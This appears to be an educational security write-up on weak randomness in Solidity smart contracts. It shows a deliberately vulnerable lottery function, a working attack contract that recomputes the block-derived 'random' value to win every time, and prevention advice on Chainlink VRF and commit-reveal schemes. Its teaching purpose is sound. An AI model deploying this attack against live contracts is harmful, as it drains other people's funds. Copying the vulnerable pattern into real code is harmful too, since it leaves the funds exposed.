# Weak Randomness / Bad Randomness

## Introduction
Weak randomness arises when a smart contract relies on predictable or manipulatable blockchain properties to generate random numbers. In deterministic systems like blockchains, true randomness is impossible to achieve natively without off-chain resources (like Oracles).

Using variables such as `block.timestamp`, `block.difficulty`, `block.number`, or `blockhash` creates an illusion of randomness that can be easily exploited by malicious actors or miners.

## The Vulnerability
Smart contracts often need randomness for:
- Lotteries and raffles
- NFT minting (determining rarity)
- Game mechanics (critical hits, loot drops)

If the outcome depends on variables that are public or controllable, attackers can predict the result and game the system.

### Weak Sources
1. **`block.timestamp`**: The timestamp of the current block. Miners can manipulate this value slightly (within a ~15-second window usually) to favor a specific outcome.
2. **`block.difficulty` / `block.prevrandao`**: On PoW chains, this was difficulty. On Ethereum PoS (The Merge), this is `prevrandao` (randomness mix). While it seems random, it is known to the block proposer and effectively public within the execution environment.
3. **`block.number`**: The height of the current block. This is completely predictable.
4. **`blockhash(block.number - 1)`**: The hash of the previous block. While it looks random, an attacker executing a transaction in the *current* block already knows the *previous* block's hash.

## Code Example
The following contract attempts to generate a random number using these weak sources:

[WeakRandomness.sol](../src/WeakRandomness.sol)
```solidity
function guessTheRandomNumber(uint256 _guess) public payable {
    require(msg.value == 1 ether, "Must send 1 ether to play");

    // VULNERABLE
    uint256 weakRandom = uint256(
        keccak256(
            abi.encodePacked(
                block.timestamp,
                block.difficulty,
                block.number,
                blockhash(block.number - 1),
                msg.sender
            )
        )
    );

    if (weakRandom == _guess) {
        (bool success, ) = msg.sender.call{value: 2 ether}("");
        require(success, "Transfer failed");
    }
}
```

## Exploit Scenario
An attacker can create a malicious contract that calls the victim contract. Since contract calls within the same transaction share the same block context (`timestamp`, `number`, `difficulty`, etc.), the attacker enters the game knowing exactly what the "random" number will be.

### Attack Contract
```solidity
contract Attack {
    WeakRandomness target;

    constructor(address _target) {
        target = WeakRandomness(_target);
    }

    function attack() public payable {
        // Simulate the exact same calculation
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.difficulty,
                    block.number,
                    blockhash(block.number - 1),
                    address(this) // The msg.sender will be this contract
                )
            )
        );

        // Call the target with the correct answer
        target.guessTheRandomNumber{value: 1 ether}(answer);
    }
}
```
Because the `attack()` function executes in the same block as the `guessTheRandomNumber` execution, `block.timestamp`, `block.difficulty`, and `blockhash` are identical. The attacker wins 100% of the time.

## Risk Assessment
- **Likelihood**: High (Common in beginner contracts)
- **Impact**: Critical (Loss of funds, rigged games)

## Prevention
To generate secure randomness, use a verifiable off-chain source.

### Chainlink VRF (Verifiable Random Function)
Chainlink VRF provides cryptographically secure randomness.
1. The contract requests a random number (sending LINK tokens).
2. Chainlink off-chain oracles generate the randomness and a cryptographic proof.
3. The proof is verified on-chain before the random number is fulfilled.

### Commit-Reveal Scheme
If external oracles are not an option:
1. **Commit Phase**: Participants submit a hash of their secret number (salt).
2. **Reveal Phase**: Participants reveal their secret number. The contract verifies the hash matches the commitment.
3. **Calculation**: The random number is generated from the combined revealed secrets.

**Note**: This is slower (requires two transactions) and can still be gamed if the last revealer decides not to reveal (if the outcome isn't favorable).
